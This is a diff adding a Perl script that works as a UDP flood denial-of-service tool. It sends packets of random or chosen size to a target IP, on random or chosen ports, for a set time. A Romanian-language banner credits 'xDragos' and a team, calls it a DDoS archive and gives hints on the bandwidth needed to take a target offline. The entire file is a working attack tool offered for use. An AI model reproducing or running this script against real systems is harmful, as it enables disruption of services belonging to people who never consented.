@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "404 not found $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+printf "[1;24m Salut Ma Numesc Dragos Acum vin cu o noua arhiva DDoS\n";
+printf "[1;24m #-----------------------------------\n";
+printf "[1;24m #Daca nu iti place arhiva Nu Fa hate\n";
+printf "[1;24m #Sa Nu uitam ca trebe sa dam flood-u\n";
+printf "[1;24m #Acum incepem sa trimitem packete...\n";
+printf "[1;24m #Persoana a intrat pe Deconectat!   \n";
+printf "[1;24m #-----------------------------------\n";
+printf "[1;24m#######################\n";
+printf "[1;24m#  Team:[TUG] Team.   #\n";
+printf "[1;24m# 	Creator:xDragos	   #\n";
+printf "[1;24m#	Editor:xDragos	   #\n";
+printf "[1;24m# 	4#Sclavi#4		   #\n";
+printf "[1;24m#  MR.RedBull         #\n";
+printf "[1;24m#  3σρ૨εα             #\n";
+printf "[1;24m#  ShaDoW             #\n";
+printf "[1;24m#######################\n";      
+					printf "[1;24m #---------------Menu----------------\n";
+					printf "[1;24m #--Momentan dai cu 1 gb/s-----------\n";
+					printf "[1;24m #--Aveti grija cand dati flood------\n";
+					printf "[1;24m #--Daca nu ai root bun nu prea merge\n";
+					printf "[1;24m #--Ca sa il pici la enter ai nevoie-\n";
+					printf "[1;24m #--De 700 upload la root-ul vostru--\n";
+					printf "[1;24m #--Menu Facut De Dragos Multumim----\n";
+					printf "[1;24m #---Best Freends eяяøя Si ɖɛռɨֆ-----\n";
+					printf "[1;24m #---Va Multumesc pt timp-ul vostru--\n";
+					printf "[1;24m #---InGheTaTa Va Pupa aici si va----\n";
+					printf "[1;24m #---Asteapta cu un like la Dragos---\n";
+					printf "[1;24m #---Va Pup Sper ca va ajutat arhiva-\n";
+					printf "[1;24m #------------Finish Menu------------\n";
+				   
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+
+#cancel(^C)
